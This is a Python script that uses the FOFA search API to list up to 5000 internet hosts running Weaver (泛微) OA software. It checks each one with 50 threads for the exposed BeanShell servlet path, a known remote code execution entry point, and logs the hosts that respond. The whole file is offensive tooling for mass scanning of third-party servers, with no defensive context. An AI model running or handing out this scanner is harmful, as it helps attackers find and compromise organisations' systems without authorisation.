# -*- coding:UTF-8 -*-
 
import requests
import threading
import time
import json
import base64
import re

proxies = {"http":None,"https":None}

headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate"
}

def POC_1(url):
    payload="/weaver/bsh.servlet.BshServlet/"
    try:
        r=requests.get(url=url+payload,headers=headers,proxies=proxies)
        if r.status_code==200 and 'BeanShell' in r.text:
            return True
        else:
            return False
    except:
        return False

def fofa():
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    email="" # 放email
    key="" # fofa key
    key_word='title="泛微" && (host=".com" || host=".cn")'
    qbase=str(base64.b64encode(key_word.encode('utf-8')),'utf-8')
    api_url = "https://fofa.info/api/v1/search/all?email={email}&size=5000&key={key}&qbase64={qbase}".format(email= email,key=key,qbase=qbase)
    
    rs = requests.get(url=api_url, verify=False,headers=headers,proxies=proxies)
    results = json.loads(rs.text)

    return results

class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
    def __init__(self, url, sem):
        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem
 
    def run(self):
        time.sleep(0.2)
        try:
            result=POC_1(self.url)
            if result==True:
                with open("success.txt", "a+") as f1:
                    f1.write(self.url + "\n")
                    print("[+] " + self.url)
            else:
                print("[-] " + self.url)
        except Exception as e:
            print("connect failed")
            pass
        self.sem.release()             #执行完函数，释放线程，线程数加1
 
class host(threading.Thread):          #遍历文件操作
    def __init__(self, sem):
        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
        self.sem = sem
 
    def run(self):
        results=fofa()
        for i in results["results"]:
            self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
            if i[0][0:5]=='https':
                host=i[0]
            else:
                host = "http://" + i[0]
            host_thread = check(host, self.sem)  
            host_thread.start()    #执行check()的执行函数

if __name__ == '__main__':
    sem = threading.Semaphore(50)      #最大线程数
    thread = host(sem)                 #传递sem值
    thread.start()

